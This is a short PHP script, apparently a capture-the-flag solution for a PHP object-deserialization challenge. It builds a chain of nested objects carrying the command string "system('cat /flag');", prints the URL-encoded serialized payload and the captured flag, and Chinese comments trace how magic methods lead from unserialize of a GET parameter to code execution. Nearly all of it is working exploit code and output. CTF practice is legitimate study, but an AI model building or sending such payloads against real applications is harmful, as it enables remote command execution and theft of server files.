<?php

class T1{
    private $a;
    function __construct($args) { $this->a = $args; }
}
class T2{
    private  $b;
    function __construct($args) { $this->b = $args; }
}
class T3{
    private  $c;
    function __construct($args) { $this->c = $args; }
}
$t3 = new T3("system('cat /flag');");
$t2_2 = new T2($t3);
$t2_1 = new T2($t2_2);
$t1 = new T1($t2_1);
echo urlencode(serialize($t1));
// O%3A2%3A%22T1%22%3A1%3A%7Bs%3A5%3A%22%00T1%00a%22%3BO%3A2%3A%22T2%22%3A1%3A%7Bs%3A5%3A%22%00T2%00b%22%3BO%3A2%3A%22T2%22%3A1%3A%7Bs%3A5%3A%22%00T2%00b%22%3BO%3A2%3A%22T3%22%3A1%3A%7Bs%3A5%3A%22%00T3%00c%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D%7D%7D%7D
// flag{th1s_1s_v4ry_4asy}


// unserialize($_GET[a]);
// 构造一个 T1 t1(t2_1)
// t1 销毁时调用 T2: 的 toString
// toString 调用 t2_1->b 的 test 但是 T2 没有 test，于是调用 call
// 试图从 T3 中取出不存在的 n，于是调用 get
// get 执行 T3 的 c
?>